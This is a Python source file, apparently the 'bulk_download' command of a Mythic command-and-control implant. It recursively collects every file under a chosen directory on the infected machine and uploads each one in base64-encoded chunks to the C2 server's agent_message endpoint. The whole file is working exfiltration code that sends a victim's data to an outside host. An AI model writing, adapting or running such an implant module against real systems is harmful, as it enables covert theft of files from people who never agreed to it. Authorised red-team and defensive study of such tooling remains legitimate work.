import os
import math
import json
import base64

CHUNK_SIZE = 512 * 1024  # 512 KB


def _post_raw(callback_id, body):
    import agent  # deferred to avoid circular import — agent.py imports this module
    encoded = base64.b64encode((callback_id + json.dumps(body)).encode())
    r = agent.SESSION.post(f"{agent.BASE_URL}/agent_message", data=encoded, timeout=30)
    return json.loads(base64.b64decode(r.content)[36:])


# Downloads a single file via Mythic's chunked download protocol.
# Never marks the task complete — the caller posts a summary to close the task.
def _download_file(callback_id, task_id, path):
    total_chunks = max(1, math.ceil(os.path.getsize(path) / CHUNK_SIZE))
    with open(path, "rb") as fh:
        # Chunk 1 — Mythic allocates a file entry and returns a file_id
        chunk = fh.read(CHUNK_SIZE)
        resp = _post_raw(callback_id, {
            "action": "post_response",
            "uuid": callback_id,
            "responses": [{"task_id": task_id, "download": {
                "total_chunks":  total_chunks,
                "chunk_num":     1,
                "chunk_data":    base64.b64encode(chunk).decode(),
                "full_path":     path,
                "is_screenshot": False,
            }}],
        })
        file_id = resp.get("responses", [{}])[0].get("file_id", "")
        if not file_id:
            raise RuntimeError(f"Mythic did not return a file_id for {path}")

        # Chunks 2..N
        for chunk_num in range(2, total_chunks + 1):
            chunk = fh.read(CHUNK_SIZE)
            _post_raw(callback_id, {
                "action": "post_response",
                "uuid": callback_id,
                "responses": [{"task_id": task_id, "download": {
                    "file_id":    file_id,
                    "chunk_num":  chunk_num,
                    "chunk_data": base64.b64encode(chunk).decode(),
                }}],
            })

        # Single-chunk file: send a follow-up empty chunk to close the file registration
        if total_chunks == 1:
            _post_raw(callback_id, {
                "action": "post_response",
                "uuid": callback_id,
                "responses": [{"task_id": task_id, "download": {
                    "file_id": file_id, "chunk_num": 1, "chunk_data": "",
                }}],
            })


# Recursively walks a directory, collects all file paths, then downloads each to Mythic.
# Each file appears separately in Mythic's Files tab. The task completes after the last file.
def execute(params, task_id, callback_id):
    import agent  # deferred to avoid circular import — agent.py imports this module
    try:
        parsed = json.loads(params)
        src = parsed.get("src", "").strip()
    except Exception:
        agent.post_response(callback_id, task_id, "bulk_download: invalid parameters")
        return None

    src = os.path.expanduser(src)

    if not src:
        agent.post_response(callback_id, task_id, "bulk_download: src is required")
        return None
    if not os.path.exists(src):
        agent.post_response(callback_id, task_id, f"bulk_download: directory not found: {src}")
        return None
    if not os.path.isdir(src):
        agent.post_response(callback_id, task_id, f"bulk_download: not a directory: {src}")
        return None

    # Collect all files recursively
    all_files = []
    for root, _, files in os.walk(src):
        for filename in files:
            all_files.append(os.path.join(root, filename))

    if not all_files:
        agent.post_response(callback_id, task_id, f"bulk_download: no files found in {src}")
        return None

    total   = len(all_files)
    results = []
    for i, path in enumerate(all_files, start=1):
        try:
            _download_file(callback_id, task_id, path)
            results.append(f"[{i}/{total}] downloaded: {path}")
        except Exception as e:
            results.append(f"[{i}/{total}] error: {path} — {str(e)}")

    agent.post_response(callback_id, task_id, "\n".join(results))
    return None  # always — this command manages all its own posts
